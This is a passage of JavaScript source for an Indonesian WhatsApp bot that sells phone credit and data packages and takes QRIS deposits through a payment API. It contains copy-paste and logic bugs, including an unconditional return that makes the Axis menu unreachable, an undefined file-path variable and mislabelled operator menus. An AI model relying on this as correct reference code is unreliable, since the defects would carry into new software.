  		// { title: "Pulsa Gift", description: "Display Pulsa Indosat", id: ".pulsaind-gift" }, 
  		// { title: "Pulsa Reguler Combo", description: "Display Pulsa Indosat", id: ".pulsaind-reguler-combo" }, 
  		// { title: "Pulsa Combo Data", description: "Display Pulsa Indosat", id: ".pulsaind-combo-data" }
  		], 
  	},
  	];

  	let listMessage = {
  		title: "Pilih Paket Pulsa Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;


  case "menupulsasmartfren":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr(); 
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);

  	}



  	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*
  	⚝ *I N F O - B O T* ⚝

  	≡ *NamaBot* : ${namabot}
  	≡ *Nama* : ${pushname}
  	≡ *Nomor Owner* : ${owner}
  	≡ *Saldo* : ${formatmoney(slo)}
  	≡ *Role* : ${cek("role", m.sender)}

  	*Berikut List Operator Pulsa Smartfren*
  	`;
  	let sections = [
  	{
  		title: "List Menu Pulsa Smartfren 🧾",
  		highlight_label: "Menu Lists Kuota Indosat",
  		rows: [
  		{ title: "Pulsa Normal", description: `Display Pulsa Smartfren`, id: ".pulsasmr" },
  		{ title: "Pulsa Transfer", description: `Displays Pulsa Smartfren`, id: ".smartfren-transfer" },
  		],
  	},
  	];
  	let listMessage = {
  		title: "Pilih Paket Pulsa Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;

  case "menupulsatri":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr(); 
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);

  	}



  	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*
  	⚝ *I N F O - B O T* ⚝

  	≡ *NamaBot* : ${namabot}
  	≡ *Nama* : ${pushname}
  	≡ *Nomor Owner* : ${owner}
  	≡ *Saldo* : ${formatmoney(slo)}
  	≡ *Role* : ${cek("role", m.sender)}

  	*Berikut List Operator Pulsa Smartfren*
  	`;
  	let sections = [
  	{
  		title: "List Menu Pulsa Tri 🧾",
  		highlight_label: "Menu Lists Pulsa Tri",
  		rows: [
  		{ title: "Pulsa Normal", description: `Display Pulsa Tri`, id: ".pulsatri" },
  		{ title: "Pulsa Transfer", description: `Displays Pulsa Transfer`, id: ".pulsatri-transfer" },
  		{ title: "Pulsa Mix", description: "Displays Pulsa Tri", id: ".pulsatri-mix" }
  		],
  	},
  	];
  	let listMessage = {
  		title: "Pilih Paket Pulsa Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;

  case "menupulsaxl":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr(); 
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);

  	}



  	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*
  	⚝ *I N F O - B O T* ⚝

  	≡ *NamaBot* : ${namabot}
  	≡ *Nama* : ${pushname}
  	≡ *Nomor Owner* : ${owner}
  	≡ *Saldo* : ${formatmoney(slo)}
  	≡ *Role* : ${cek("role", m.sender)}

  	*Berikut List Operator Pulsa XL*
  	`;
  	let sections = [
  	{
  		title: "List Menu Pulsa XL 🧾",
  		highlight_label: "Menu Lists Pulsa XL",
  		rows: [
  		{ title: "Pulsa Normal", description: `Display Pulsa XL`, id: ".pulsaxl" },
  		{ title: "Pulsa Transfer", description: `Displays Pulsa XL`, id: ".pulsaxl-transfer" },
  		{ title: "Pulsa Mix", description: "Displays Pulsa XL", id: ".pulsaxl-mix" }
  		],
  	},
  	];
  	let listMessage = {
  		title: "Pilih Paket Pulsa Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;

  case "menupulsabyu":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr(); 
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);

  	}



  	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*
  	⚝ *I N F O - B O T* ⚝

  	≡ *NamaBot* : ${namabot}
  	≡ *Nama* : ${pushname}
  	≡ *Nomor Owner* : ${owner}
  	≡ *Saldo* : ${formatmoney(slo)}
  	≡ *Role* : ${cek("role", m.sender)}

  	*Berikut List Operator Pulsa By.U*
  	`;
  	let sections = [
  	{
  		title: "List Menu Pulsa By.U 🧾",
  		highlight_label: "Menu Lists Pulsa By.U",
  		rows: [
  		{ title: "Pulsa Normal", description: `Display Pulsa By.U`, id: ".pulsabyu" },
  		{ title: "Pulsa Transfer", description: `Displays Pulsa By.U`, id: ".pulsabyu-transfer" },
  		],
  	},
  	];
  	let listMessage = {
  		title: "Pilih Paket Pulsa Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;

  case "menukuotaaxis":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null)
  		daftarr();
  	return reply(
  		`_Silahkan ketik *menu* kembali_`
  		);


  	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*
  	⚝ *I N F O - B O T* ⚝

  	≡ *NamaBot* : ${namabot}
  	≡ *Nama* : ${pushname}
  	≡ *Nomor Owner* : ${owner}
  	≡ *Saldo* : ${formatmoney(slo)}
  	≡ *Role* : ${cek("role", m.sender)}

  	*Berikut List Operator Kuota Internet*
  	`;
  	let sections = [
  	{
  		title: "List Menu Kuota Axis 🧾",
  		highlight_label: "Menu Lists Kuota Axis",
  		rows: [
  		{ title: "Kuota Normal", description: "Display Kuota Axis", id: ".umumaxis" },
  		{ title: "Kuota Mini", description: "Displays Kuota Axis", id: ".miniaxis" },
  		{ title: "Kuota Kzl", description: "Displays Kuota Axis", id: ".kzlaxis" },
  		{ title: "Kuota Bronet", description: "Display Kuota Axis", id: ".bronetaxis" },
  		{ title: "Kuota Warnet", description: "Display Kuota Axis", id: ".warnetaxis" },
  		{ title: "Kuota Ekstra", description: "Display Kuota Axis", id: ".ekstraaxis" },
  		{ title: "Kuota Owsem", description: "Display Kuota Axis", id: ".owsemaxis" },
  		{ title: "Kuota Games", description: "Displays Kuota Axis", id: ".gameaxis" }
  		]
  	}
  	];

  	let listMessage = {
  		title: "Pilih Paket Kuota Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;

  case "menukuotaindosat":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr(); 
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);

  	}



  	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*
  	⚝ *I N F O - B O T* ⚝

  	≡ *NamaBot* : ${namabot}
  	≡ *Nama* : ${pushname}
  	≡ *Nomor Owner* : ${owner}
  	≡ *Saldo* : ${formatmoney(slo)}
  	≡ *Role* : ${cek("role", m.sender)}

  	*Berikut List Operator Kuota Internet*
  	`;
  	let sections = [
  	{
  		title: "List Menu kuota Indosat 🧾",
  		highlight_label: "Menu Lists Kuota Indosat",
  		rows: [
  		{ title: "Kuota Normal", description: `Display Kuota Indosat`, id: ".paketind" },
  		{ title: "Kuota Yellow", description: `Displays Kuota Indosat`, id: ".yellow-ind" },
  		{ title: "Kuota Yellow Gift", description: `Displays Kuota Indosat`, id: ".yellow-gift" },
  		{ title: "Kuota Gift Data", description: `Display kuota Indosat`, id: ".giftdata" },
  		{ title: "Freedom Harian", description: `Display Kuota Indosat`, id: ".freedom-harian" },
  		{ title: "Freedom Internet", description: `Displays Kuota Indosat`, id: ".freedom-internet" },
  		{ title: "Freedom Internet Gift", description: `Display Kuota Indosat`, id: ".freedom-internet-gift" },
  		{ title: "Freedom Internet U", description: `Display Kuota Indosat`, id: ".freedom-u" },
  		{ title: "Freedom U Gift", description: `Display Kuota Indosat`, id: ".freedom-u-gift" },
  		{ title: "UMKM", description: `Display Kuota UMKM`, id: ".ind-umkm" },
  		],
  	},
  	];
  	let listMessage = {
  		title: "Pilih Paket Kuota Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;


// Usage in the case block
case "menukuotasmartfren":
{
	var slo = cek("saldo", m.sender);
	if (cek("id", m.sender) == null) {
		daftarr();
		reply(`_Silahkan ketik *menu* kembali_`);
	}

	const Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*
	⚝ *I N F O - B O T* ⚝

	≡ *NamaBot* : ${namabot}
	≡ *Nama* : ${pushname}
	≡ *Nomor Owner* : ${owner}
	≡ *Saldo* : ${formatmoney(slo)}
	≡ *Role* : ${cek("role", m.sender)}

	*Berikut List Operator Kuota Smartfren*`;

	const sections = [
	{
		title: "List Menu kuota Indosat 🧾",
		highlight_label: "Menu Lists Kuota Indosat",
		rows: [
		{ title: "Kuota Normal", description: `Display Kuota Smartfren`, id: ".paketsmr" },
		{ title: "Kuota Unlimited", description: `Displays Kuota Smartfren`, id: ".smartfren-unlimited" },
		{ title: "Kuota Volume", description: `Displays Kuota Smartfren`, id: ".smartfren-volume" },
		{ title: "Kuota Youtube", description: `Display kuota Smartfren`, id: ".smartfren-youtube" },
		{ title: "Kuota Connex Evo", description: `Display Kuota Smartfren`, id: ".smartfren-connex" },
		{ title: "Kuota Gokil Max", description: `Display Kuota Smartfren`, id: ".smartfren-gokil-max" },
		{ title: "Kuota Gokil Combo", description: `Display Kuota Smartfren`, id: ".smartfren-gokil-combo" },
		{ title: "Kuota Nonstop", description: `Displays Kuota Smartfren`, id: ".smartfren-1on+" },
		{ title: "Kuota Unlimited Nonstop", description: `Displays Kuota Smartfren`, id: ".smartfren-unlimited-nonstop" },
		{ title: "Kuota ( Kuota )", description: `Displays Kuota Smartfren`, id: ".smartfren-kuota" },
		{ title: "Kuota Mandiri", description: `Displays Kuota Smartfren`, id: ".smartfren-mandiri" },

		],
	},
	];

	const listMessage = {
		title: "Pilih Paket Kuota Disini",
		sections,
	};

	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

	await kris.relayMessage(msg.key.remoteJid, msg.message, {
		messageId: msg.key.id,
	});
}
break;



  // Jalankan update data saat aplikasi dimulai
  // updateData();
  // setInterval(updateData, 300000);

  case "kuota":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null)
  		return reply(
  			`_Anda Belum Terdaftar di Database Silahkan ketik *#daftar*_`
  			);

  	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*
  	⚝ *I N F O - B O T* ⚝

  	≡ *NamaBot* : ${namabot}
  	≡ *Nama* : ${pushname}
  	≡ *Nomor Owner* : ${owner}
  	≡ *Saldo* : ${formatmoney(slo)}
  	≡ *Role* : ${cek("role", m.sender)}

  	*Berikut List Operator Kuota Internet*
  	`;
  	let sections = [
  	{
  		title: "List Menu Operator 🧾",
  		highlight_label: "Menu Lists Operator",
  		rows: [
  		{ title: "Kuota Axis", description: "Display Paket Axis", id: ".menukuotaaxis" },
  		{ title: "Paket Telkomsel", description: "Displays Paket Telkomsel", id: ".paketssel" },
  		{ title: "Paket Indosat", description: "Displays Paket Indosat", id: ".menukuotaindosat" },
  		{ title: "Paket Smartfren", description: "Display Paket Smartfren", id: ".menukuotasmartfren" },
  		{ title: "Paket XL", description: "Display Paket XL", id: ".paketxl" },
  		{ title: "Paket Tri", description: "Display Paket Tri", id: ".pakettri" },
  		{ title: "Paket By.U", description: "Displays Paket By.U", id: ".paketbyu" }
  		]
  	}
  	];

  	let listMessage = {
  		title: "Pilih Operatornya Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;
  case "allmenu":
  {
  	if (cek("id", m.sender) == null)
  		return reply(
  			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
  			);

  	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*

  	║ ╭─❏ *『 INFORMASI 』*
  	║ ➪ Name :  ${pushname}
  	║ ➪ Nomor : ${cek("id", m.sender).split("@")[0]}
  	║ ➪ Role : ${cek("role", m.sender)}
  	║ ➪ OwnerBotz : ${ownernya}
  	┗━━━━━━━━━━━━━━━━━━⬣

  	▮──────★ *MENU STORE*
  	▮╰➳ *${prefix}topup*
  	▮╰➳ *${prefix}deposit*
  	▮╰➳ *${prefix}listtrx*
  	▮╰➳ *${prefix}upgraderole*
  	▮╰➳ *${prefix}listdeposit*
  	▮╰➳ *${prefix}ndepo*
  	▮╰➳ *${prefix}batal*
  	▮╰➳ *${prefix}bukti*
  	▮╰➳ *${prefix}ceksaldo*
  	▮╰➳ *${prefix}pulsa*
  	▮╰➳ *${prefix}topupgames*
  	▮╰➳ *${prefix}kuota*
  	▮╰➳ *${prefix}pln*
  	▮╰➳──────────────────★

  	▮──────★ *DEPOSIT OTOMATIS*
  	▮╰➳ *${prefix}depopay*
  	▮╰➳ *${prefix}cekdepo*
  	▮╰➳ *${prefix}cancel*
  	▮──────────────────★

  	▮──────⭓ *ORDER OTP*
  	▮╰➳ *${prefix}kodenegara*
  	▮╰➳ *${prefix}listotp*
  	▮╰➳ *${prefix}buyotp*
  	▮╰➳ *${prefix}statusotp*
  	▮╰➳ *${prefix}akunotpweb*
  	▮──────────────────★

  	▮──────⭓ *MENU OWNER*
  	▮╰➳ *${prefix}setprofit*
  	▮╰➳ *${prefix}getdigi*
  	▮╰➳ *${prefix}saldodigi*
  	▮╰➳ *${prefix}addsaldo*
  	▮╰➳ *${prefix}minsaldo*
  	▮╰➳ *${prefix}rekapsaldo*
  	▮╰➳ *${prefix}rekaptrx*
  	▮╰➳ *${prefix}acc*
  	▮╰➳ *${prefix}tolak*
  	▮╰➳ *${prefix}ubahrole*
  	▮╰➳ *${prefix}getip*
  	▮──────────────────★
  	`;
  	let sections = [
  	{
  		title: "List Menu 🧾",
  		highlight_label: "All Menu Lists",
  		rows: [
  		{
  			title: "Menu Topup",
  			description: `Displays MENU RPG`,
  			id: ".topupmenu",
  		},
  		{
  			title: "Top-Up Ovo",
  			description: `Displays Top-Up Ovo`,
  			id: ".topup-ovo",
  		},
  		],
  	},
  	];
  	let listMessage = {
  		title: "Menu Disini",
  		sections,
  	};

  	let msg = generateWAMessageFromContent(
  		from,
  		{
  			viewOnceMessage: {
  				message: {
  					messageContextInfo: {
  						deviceListMetadata: {},
  						deviceListMetadataVersion: 2,
  					},
  					interactiveMessage: proto.Message.InteractiveMessage.create({
  						body: proto.Message.InteractiveMessage.Body.create({
  							text: Anu,
  						}),
  						footer: proto.Message.InteractiveMessage.Footer.create({
  							text: botname,
  						}),
  						header: proto.Message.InteractiveMessage.Header.create({
  							...(await prepareWAMessageMedia(
  								{ image: banner },
  								{ upload: kris.waUploadToServer }
  								)),
  							title: ``,
  							gifPlayback: true,
  							subtitle: ownername,
  							hasMediaAttachment: false,
  						}),
  						nativeFlowMessage:
  						proto.Message.InteractiveMessage.NativeFlowMessage.create(
  						{
  							buttons: [
  							{
  								name: "quick_reply",
  								buttonParamsJson: `{"display_text":"Cek Saldo","id":"${prefix}ceksaldo"}`,
  							},
  							{
  								name: "quick_reply",
  								buttonParamsJson: `{"display_text":"Riwayat TopUp","id":"${prefix}listtrx"}`,
  							},
  							{
  								name: "quick_reply",
  								buttonParamsJson: `{"display_text":"Topup","id":"${prefix}topupmenu"}`,
  							},
  							],
  						}
  						),
  						contextInfo: {
  							mentionedJid: [m.sender],
  							forwardingScore: 999,
  							isForwarded: true,
  							forwardedNewsletterMessageInfo: {
  								newsletterJid: "1203",
  								newsletterName: ownername,
  								serverMessageId: 143,
  							},
  						},
  					}),
  				},
  			},
  		},
  		{}
  		);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;

  // case "otomatis": 
  // {
  // 	reply(`_Saat ini deposit otomatis sedang perbaikan, silahkan menggunakan deposit manual dengan owner_`)
  // }

  case "val":
  {
  	console.log(global.paydisini.type_fee);
  }

  break;
  case "otomatis":
  case "depopay": {
  	let no = q.split(" ")[0];
  	if (!no) return reply(`Jumlahnya mana?\n.depopay nominal`);

    // Membuat referensi deposit
    let reff_deposi = crypto.randomBytes(5).toString("hex").toUpperCase();
    const url = "https://api.paydisini.co.id/v1/";
    const key = global.paydisini.apikey;
    const idpay = global.paydisini.idpay;
    const unikcode = `${reff_deposi}`;
    const notecode = `TRX-${reff_deposi}`;
    const serv = global.paydisini.layanan;  // ID untuk layanan
    const validt = global.paydisini.validt; // Waktu validitas
    const type_fee = global.paydisini.type_fee;
    const nominal = Number(no); // Nominal deposit

    // Generate signature untuk permintaan deposit baru
    const signature = crypto.createHash("md5").update(key + unikcode + serv + nominal + validt + "NewTransaction").digest("hex");
    const FormData = require("form-data");
    const fetch = require("node-fetch");

    // Membuat FormData untuk dikirimkan ke API
    const data = new FormData();
    data.append("key", key);
    data.append("pay_id", idpay);
    data.append("request", "new");
    data.append("unique_code", unikcode);
    data.append("service", serv);
    data.append("amount", nominal);
    data.append("note", notecode);
    data.append("valid_time", validt);
    data.append("type_fee", type_fee);
    data.append("signature", signature);

    try {
        // Kirim permintaan deposit baru ke API
        const response = await fetch(url, {
        	method: "POST",
        	body: data,
        });

        const responseData = await response.json();
        if (responseData.success) {
        	const data = responseData.data;
        	console.log(data);
        	let teks = 
        	`✦━━━━━━━━━━━━━━━━━✦\n` +
        	`*KONFIRMASI PEMBAYARAN*\n` +
        	`✦━━━━━━━━━━━━━━━━━✦\n\n` +
        	`⍟ Url Qris: ${data.checkout_url_v3}\n\n` +
        	`⍟ Ref Id: ${data.unique_code}\n` +
        	`⍟ Status: ${data.status}\n` +
        	`⍟ Jumlah Deposit: ${nominal}\n` +
        	`⍟ Fee: ${formatmoney(data.fee)}\n` +
        	`⍟ Saldo Diterima: ${data.balance}\n` +
        	`⍟ Total: ${formatmoney(data.amount)}\n` +
        	`⍟ Expired: ${data.expired}\n\n` +
        	`Silakan Buka Url dan scan QRIS tersebut sebelum waktu expired 5 menit. Jika sudah melakukan pembayaran, harap tunggu verifikasi.`;

        	// let gambr = { url: data.qrcode_url };
        	// await kris.sendMessage(from, { image: gambr, caption: teks });
        	// await kris.sendMessage(from, text: teks)
        	await kris.sendMessage(from, { text: teks }, { quoted: m });

            // Simpan detail deposit ke file untuk pengecekan status
            let obj = {
            	id: m.sender.split("@")[0],
            	ref: data.unique_code,
            	jumlah_bayar: data.amount,
            	jumlah_deposit: nominal,
            	saldo_diterima: data.balance,
            	pay: "QRIS",
            	biaya_layanan: data.fee,
            };
            fs.writeFileSync(PathAutoo + m.sender.split("@")[0] + ".json", JSON.stringify(obj));

            // Pengecekan status secara otomatis
            const checkStatusInterval = setInterval(async () => {
            	try {
            		const statusSignature = crypto.createHash("md5").update(key + data.unique_code + "StatusTransaction").digest("hex");
            		const statusData = new FormData();
            		statusData.append("key", key);
            		statusData.append("request", "status");
            		statusData.append("unique_code", data.unique_code);
            		statusData.append("signature", statusSignature);

            		const statusResponse = await fetch(url, {
            			method: "POST",
            			body: statusData,
            		});

            		const statusResponseData = await statusResponse.json();
            		console.log(statusResponseData.data.status)
            		if (statusResponseData.success) {
            			const statusData = statusResponseData.data;
            			if (statusData.status === "Success") {
            				sett("+saldo", m.sender, nominal);
            				let lop = 
            				`✅ *Deposit Berhasil!*\n\nDeposit Anda telah berhasil diproses. Berikut detailnya:\n` +
            				`- *Nomor Transaksi:* _${data.unique_code}_\n` +
            				`- *Jumlah Deposit:* _${nominal}_\n` +
            				`- *Metode Pembayaran:* _QRIS_\n` +
            				`- *Tanggal:* _${statusData.created_at}_\n` +
            				`- *Saldo Anda :* _${cek("saldo", m.sender)}_\n\n` +
            				`Saldo Anda sekarang telah diperbarui. Terima kasih atas depositnya!`;
            				reply(lop);
            				fs.unlinkSync(PathAutoo + m.sender.split("@")[0] + ".json");
            				clearInterval(checkStatusInterval);
            			} else if (statusData.status === "Canceled") {
            				reply("Pembayaran deposit Anda telah dibatalkan.");
            				fs.unlinkSync(PathAutoo + m.sender.split("@")[0] + ".json");
            				clearInterval(checkStatusInterval);
            			}
            		} else {
            			reply("Gagal mendapatkan status deposit. Silakan coba lagi nanti.");
            			clearInterval(checkStatusInterval);
            		}
            	} catch (error) {
            		console.error("Terjadi kesalahan saat pengecekan status:", error);
            		reply("Terjadi kesalahan saat memproses transaksi, silakan coba lagi nanti.");
            		clearInterval(checkStatusInterval);
            	}
            }, 20000); // Cek setiap 20 detik

        } else {
        	reply(`Error: ${responseData.msg}`);
        }
    } catch (error) {
    	console.error("Terjadi kesalahan:", error);
    	reply("Terjadi kesalahan saat memproses transaksi, silakan coba lagi nanti.");
    }
}
break;





case "cancel":
{
	if (
		!fs.existsSync(
			`./Pengaturan/database/deposit/otomatis/${
				m.sender.split("@")[0]
			}.json`
			)
		)
		return reply("Anda Belum Melakukan deposit");
	let data_depo = JSON.parse(
		fs.readFileSync(PathAutoo + sender.split("@")[0] + ".json")
		);
      	// return data_depo;
      	var FormData = require("form-data");
      	var data = new FormData();
      	const key = global.keydepo;
      	const signature = md5(key + data_depo.ref + "CancelTransaction");
      	data.append("key", key);
      	data.append("request", "cancel");
      	data.append("unique_code", data_depo.ref);
      	data.append("signature", signature);

      	var config = {
      		method: "post",
      		maxBodyLength: Infinity,
      		url: "https://paydisini.co.id/api/",
      		headers: {
      			...data.getHeaders(),
      		},
      		data: data,
      	};

      	axios(config)
      	.then(function (response) {
      		reply(`Deposit Dengan ID: ${data_depo.ref} Berhasil Di Batalkan`);
      		fs.unlinkSync(PathAutoo + m.sender.split("@")[0] + ".json");
      	})
      	.catch(function (error) {
      		reply(`Error`);
      		console.log(error);
      	});
      }
      break;
      case "cekdepo":
      {
      	if (
      		!fs.existsSync(
      			`./Pengaturan/database/deposit/otomatis/${
      				m.sender.split("@")[0]
      			}.json`
      			)
      		)
      		return reply("Anda Belum Melakukan deposit");
      	let data_depo = JSON.parse(
      		fs.readFileSync(PathAutoo + sender.split("@")[0] + ".json")
      		); 
      	// return data_depo;
      	const url = "https://paydisini.co.id/api/";
      	const keyy = global.keydepo;
      	const ref = data_depo.ref;
      	var nom = Number(data_depo.saldo_diterima);
      	const statusSignature = md5(keyy + ref + "StatusTransaction");
      	var FormData = require("form-data");
      	var data = new FormData();
      	data.append("key", keyy);
      	data.append("request", "status");
      	data.append("unique_code", ref);
      	data.append("signature", statusSignature);

      	try {
      		const response = await fetch(url, {
      			method: "POST",
      			body: data,
      		});

      		const responseData = await response.json();
      		if (responseData.success) {
      			const data = responseData.data;
      			if (data.status === "Success") {
      				sett("+saldo", m.sender, nom);
      				var lop = `✅ *Deposit Berhasil!*\n\nDeposit Anda telah berhasil diproses. Berikut detailnya:\n- *Nomor Transaksi:* _${data_depo.ref}_\n- *Jumlah Deposit:* _${data_depo.saldo_diterima}_\n- *Metode Pembayaran:* _${data_depo.pay}_\n- *Tanggal:* _${data.created_at}_\n- *Saldo Anda :* _${cek("saldo", m.sender)}_\n\n_Saldo Anda sekarang telah diperbarui. Terima kasih atas depositnya!_`;
      				reply(lop);
      				fs.unlinkSync(PathAuto + m.sender.split("@")[0] + ".json");
      			} else {
      				reply(
      					`Deposit Anda Masih Pending Silahkan Transfer Terlebih Dahulu Ke Qris Yang Di Sediakan`
      					);
      			}
      		}
      	} catch (error) {
      		console.error("Terjadi kesalahan:", error);

      		m.reply(
      			"Terjadi kesalahan saat memproses transaksi, silakan coba lagi nanti."
      			);
      	}
      }
      break;

      case "topupmenu":
      case "store":
      {
      	if (cek("id", m.sender) == null)
      		return reply(
      			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
      			);

      	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*

      	> ╭─❏ *『 INFORMASI 』*
      	> ║ ➪ Name :  ${pushname}
      	> ║ ➪ Nomor : ${cek("id", m.sender).split("@")[0]}
      	> ║ ➪ Role : ${cek("role", m.sender)}
      	> ┗━━━━━━━━━━━━━━━━━━⬣
      	Berikut Menu Topup/Isi Ulang
      	> ┌──────⭓ *CARA TOPUP*
      	> │ Langkah-langkah top-up:
      	> │1. Pastikan Saldo Anda cukup untuk        melakukan Transaksi. 
      	> │2. Pastikan No Telepon / id games /       id token yang anda berikan benar. 
      	> │3. Pastikan Nomor Tujuan Benar            sehingga tidak menyebabkan             kesalahan topup
      	> └──────────────────⭓
      	`;
      	let msg = generateWAMessageFromContent(
      		from,
      		{
      			viewOnceMessage: {
      				message: {
      					messageContextInfo: {
      						deviceListMetadata: {},
      						deviceListMetadataVersion: 2,
      					},
      					interactiveMessage: proto.Message.InteractiveMessage.create({
      						body: proto.Message.InteractiveMessage.Body.create({
      							text: Anu,
      						}),
      						footer: proto.Message.InteractiveMessage.Footer.create({
      							text: botname,
      						}),
      						header: proto.Message.InteractiveMessage.Header.create({
      							...(await prepareWAMessageMedia(
      								{ image: banner },
      								{ upload: kris.waUploadToServer }
      								)),
      							title: ``,
      							gifPlayback: true,
      							subtitle: ownername,
      							hasMediaAttachment: false,
      						}),
      						nativeFlowMessage:
      						proto.Message.InteractiveMessage.NativeFlowMessage.create(
      						{
      							buttons: [
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Pulsa","id":"${prefix}pulsa"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Emoney","id":"${prefix}topupemoney"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Kuota / Paket","id":"${prefix}kuota"}`,
      							},

      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Topup Games","id":"${prefix}topupgames"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Token","id":"${prefix}pln"}`,
      							},
      							],
      						}
      						),
      						contextInfo: {
      							mentionedJid: [m.sender],
      							forwardingScore: 999,
      							isForwarded: true,
      							forwardedNewsletterMessageInfo: {
      								newsletterJid: "1203",
      								newsletterName: ownername,
      								serverMessageId: 143,
      							},
      						},
      					}),
      				},
      			},
      		},
      		{}
      		);

      	await kris.relayMessage(msg.key.remoteJid, msg.message, {
      		messageId: msg.key.id,
      	});
      }
      break;

      case "pulsa2":
      {
      	if (cek("id", m.sender) == null)
      		return reply(
      			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
      			);

      	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*

      	> ╭─❏ *『 INFORMASI 』*
      	> ║ ➪ Name :  ${pushname}
      	> ║ ➪ Nomor : ${cek("id", m.sender).split("@")[0]}
      	> ║ ➪ Role : ${cek("role", m.sender)}
      	> ┗━━━━━━━━━━━━━━━━━━⬣
      	Berikut Menu Topup/Isi Ulang
      	> ┌──────⭓ *MENU TOPUP*
      	> │⭔ Berikut List Operator Pulsa
      	> └──────────────────⭓
      	`;
      	let msg = generateWAMessageFromContent(
      		from,
      		{
      			viewOnceMessage: {
      				message: {
      					messageContextInfo: {
      						deviceListMetadata: {},
      						deviceListMetadataVersion: 2,
      					},
      					interactiveMessage: proto.Message.InteractiveMessage.create({
      						body: proto.Message.InteractiveMessage.Body.create({
      							text: Anu,
      						}),
      						footer: proto.Message.InteractiveMessage.Footer.create({
      							text: botname,
      						}),
      						header: proto.Message.InteractiveMessage.Header.create({
      							...(await prepareWAMessageMedia(
      								{ image: banner },
      								{ upload: kris.waUploadToServer }
      								)),
      							title: ``,
      							gifPlayback: true,
      							subtitle: ownername,
      							hasMediaAttachment: false,
      						}),
      						nativeFlowMessage:
      						proto.Message.InteractiveMessage.NativeFlowMessage.create(
      						{
      							buttons: [
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Pulsa Indosat","id":"${prefix}menupulsaindosat"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Pulsa Smartfren","id":"${prefix}menupulsasmartfren"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Pulsa Axis","id":"${prefix}menupulsaaxis"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Pulsa XL","id":"${prefix}menupulsaxl"}`,
      							},
      							{
      								name: "quick_reply",
